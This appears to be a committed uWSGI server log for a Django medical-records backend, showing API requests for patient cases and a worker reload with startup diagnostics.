+[pid: 1552743|app: 0|req: 29/86] 219.239.227.174 () {42 vars in 860 bytes} [Thu May  9 21:42:00 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 91 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552739|app: 0|req: 15/87] 219.239.227.174 () {42 vars in 858 bytes} [Thu May  9 21:42:00 2024] GET /api/medical/get_case?patient_id=3 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552739|app: 0|req: 16/88] 219.239.227.174 () {42 vars in 860 bytes} [Thu May  9 21:42:01 2024] GET /api/medical/get_case?patient_id=10 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 34/89] 180.101.244.15 () {42 vars in 828 bytes} [Fri May 10 00:46:53 2024] GET /api/medical/get_all_patient => generated 43 bytes in 16 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
+...gracefully killing workers...
+Gracefully killing worker 3 (pid: 1552742)...
+Gracefully killing worker 1 (pid: 1552739)...
+Gracefully killing worker 2 (pid: 1552740)...
+Gracefully killing worker 4 (pid: 1552743)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/chuangxin/vasorum-detacted-backend
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 6 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.23 (64bit) on [Fri May 10 19:19:43 2024] ***
+compiled with version: 11.2.0 on 15 January 2024 06:07:54
+os: Linux-5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023
+nodename: VM-16-17-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 2
+current working directory: /home/ubuntu/chuangxin/vasorum-detacted-backend
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/ubuntu/chuangxin/vasorum-detacted-backend
+your processes number limit is 7401
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 6
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Set PythonHome to /home/ubuntu/anaconda3/envs/django
+Python main interpreter initialized at 0x5586c27a02f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+added /home/ubuntu/anaconda3/envs/django/lib/python3.10/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x5586c27a02f0 pid: 1552004 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1552004)
+spawned uWSGI worker 1 (pid: 2820356, cores: 2)
+spawned uWSGI worker 2 (pid: 2820357, cores: 2)
+spawned uWSGI worker 3 (pid: 2820359, cores: 2)
+spawned uWSGI worker 4 (pid: 2820360, cores: 2)
